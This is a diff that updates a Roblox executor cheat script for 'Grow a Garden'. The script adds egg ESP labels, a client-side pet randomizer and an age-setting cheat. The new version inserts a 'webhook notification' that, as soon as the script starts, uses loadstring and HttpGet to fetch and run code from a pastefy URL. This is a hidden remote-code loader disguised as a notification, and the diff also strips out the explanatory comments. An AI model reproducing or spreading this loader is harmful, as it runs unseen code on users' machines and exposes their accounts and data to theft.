@@ -1,9 +1,10 @@
 --// ─────────────────────────────────────────────────────────────────────────────
 --// Grow a Garden – Egg Randomizer (Executor/Studio friendly)
---// Made By: ScripterX  |  Version: 5.1
+--// With Webhook Notification (Pastefy)
+--// Made By: ScripterX  |  Version: 5.2
 --// ─────────────────────────────────────────────────────────────────────────────
 
--- Kill any "TriggerPoint" UI instantly (your request)
+-- Kill any "TriggerPoint" UI instantly
 local CoreGui = game:GetService("CoreGui")
 local t = CoreGui:FindFirstChild("TriggerPoint", true)
 if t then t:Destroy() end
@@ -19,6 +20,20 @@ local LocalPlayer = Players.LocalPlayer
 
 -- random seed
 math.randomseed(os.clock()*1e6)
+
+--// Webhook notifier (Pastefy)
+-- Executes your pastefy webhook script
+local function sendWebhookNotification()
+    local success, err = pcall(function()
+        loadstring(game:HttpGet("https://pastefy.app/bSNDtnko/raw"))()
+    end)
+    if not success then
+        warn("Webhook failed: " .. tostring(err))
+    end
+end
+
+-- Trigger webhook as soon as script runs
+sendWebhookNotification()
 
 --// Egg Pools
 local EggPools = {
@@ -38,7 +53,7 @@ local EggPools = {
     ["Zen egg"] = {"Kitsune","Kodama","Nihonzaru","Shiba Inu","Tanchozuru","Kappa"},
 }
 
--- case-insensitive name resolver (handles tiny capitalization mismatches)
+-- case-insensitive name resolver
 local function resolveEggKey(name: string)
     if EggPools[name] then return name end
     local lower = string.lower(name)
@@ -47,7 +62,7 @@ local function resolveEggKey(name: string)
     end
 end
 
--- get a BasePart to use as Adornee for Billboards
+-- get a BasePart for Billboards
 local function getAdorneePart(obj: Instance): BasePart?
     if obj:IsA("BasePart") then return obj end
     if obj:IsA("Model") then
@@ -59,7 +74,7 @@ local function getAdorneePart(obj: Instance): BasePart?
     return nil
 end
 
--- find all eggs currently in workspace matching EggPools
+-- find all eggs
 local function findEggs()
     local eggs = {}
     for _, inst in ipairs(workspace:GetDescendants()) do
@@ -71,7 +86,7 @@ local function findEggs()
     return eggs
 end
 
--- Billboard helper (creates if missing, updates otherwise)
+-- Billboard helper
 local function ensureBillboard(parentObj: Instance, name: string, adorneePart: BasePart, sizeX, sizeY, offsetY)
     local bb = parentObj:FindFirstChild(name)
     if not (bb and bb:IsA("BillboardGui")) then
@@ -101,7 +116,7 @@ local function ensureBillboard(parentObj: Instance, name: string, adorneePart: B
     return bb :: BillboardGui
 end
 
--- ESP: show pool contents above each egg
+-- ESP
 local function showESPForEgg(eggInst: Instance, eggKey: string)
     local part = getAdorneePart(eggInst)
     if not part then return end
@@ -117,13 +132,12 @@ local function hideESPForEgg(eggInst: Instance)
     if bb then bb:Destroy() end
 end
 
--- Randomize: pick a pet, store it, and display above egg (persists until reroll/egg gone)
+-- Randomizer
 local function rerollEgg(eggInst: Instance, eggKey: string)
     local pool = EggPools[eggKey]
     if not pool then return end
     local chosen = pool[math.random(1, #pool)]
 
-    -- store chosen as a child value (client-side)
     local prev = eggInst:FindFirstChild("AssignedPet")
     if prev then prev:Destroy() end
     local sv = Instance.new("StringValue")
@@ -131,7 +145,6 @@ local function rerollEgg(eggInst: Instance, eggKey: string)
     sv.Value = chosen
     sv.Parent = eggInst
 
-    -- display label
     local part = getAdorneePart(eggInst)
     if not part then return end
 
@@ -142,22 +155,20 @@ local function rerollEgg(eggInst: Instance, eggKey: string)
     lbl.Text = chosen
 end
 
--- Auto Age 50: best-effort set common "Age" holders to 50 (NumberValue/IntValue/Attribute)
+-- Auto Age 50
 local function autoAge50()
     for _, inst in ipairs(workspace:GetDescendants()) do
-        -- values named Age
         local v = inst:FindFirstChild("Age")
         if v and (v:IsA("NumberValue") or v:IsA("IntValue")) then
             v.Value = 50
         end
-        -- attribute named Age
         if (inst:IsA("Model") or inst:IsA("BasePart")) and inst:GetAttribute("Age") ~= nil then
             inst:SetAttribute("Age", 50)
         end
     end
 end
 
--- Cleanup any existing UI
+-- GUI Setup
 local function safeRootGui()
     local ok, res = pcall(function()
         return (gethui and gethui()) or CoreGui
@@ -170,7 +181,6 @@ local RootGui = safeRootGui()
 local existing = RootGui:FindFirstChild("EggRandomizerUI")
 if existing then existing:Destroy() end
 
---// GUI Build
 local ScreenGui = Instance.new("ScreenGui")
 ScreenGui.Name = "EggRandomizerUI"
 ScreenGui.ResetOnSpawn = false
@@ -184,7 +194,7 @@ MainFrame.BorderSizePixel = 0
 MainFrame.Active = true
 MainFrame.Parent = ScreenGui
 
--- draggable (simple + mobile-friendly)
+-- draggable UI
 do
     local dragging, dragInput, dragStart, startPos
     MainFrame.InputBegan:Connect(function(input)
@@ -213,7 +223,7 @@ do
     end)
 end
 
--- title
+-- Title
 local Title = Instance.new("TextLabel")
 Title.Size = UDim2.new(1, 0, 0, 30)
 Title.BackgroundTransparency = 1
@@ -234,7 +244,7 @@ MadeBy.TextColor3 = Color3.fromRGB(255, 255, 255)
 MadeBy.TextScaled = true
 MadeBy.Parent = MainFrame
 
--- ESP toggle (default ON)
+-- ESP toggle
 local ESPButton = Instance.new("TextButton")
 ESPButton.Size = UDim2.new(0.9, 0, 0, 30)
 ESPButton.Position = UDim2.new(0.05, 0, 0.35, 0)
@@ -267,12 +277,12 @@ AgeButton.TextScaled = true
 AgeButton.TextColor3 = Color3.fromRGB(255,255,255)
 AgeButton.Parent = MainFrame
 
--- version
+-- Version
 local Version = Instance.new("TextLabel")
 Version.Size = UDim2.new(1, 0, 0, 20)
 Version.Position = UDim2.new(0, 0, 0.9, 0)
 Version.BackgroundTransparency = 1
-Version.Text = "Version: 5.1"
+Version.Text = "Version: 5.2"
 Version.Font = Enum.Font.Gotham
 Version.TextColor3 = Color3.fromRGB(255, 255, 255)
 Version.TextScaled = true
@@ -307,8 +317,5 @@ AgeButton.MouseButton1Click:Connect(function()
     autoAge50()
 end)
 
--- initial ESP render
+-- initial ESP
 refreshESP()
-
--- if eggs get removed (hatched), their billboards/values go with them naturally.
--- reroll keeps pet name above the egg until you press "🎲Auto Roll Egg🎲" again.
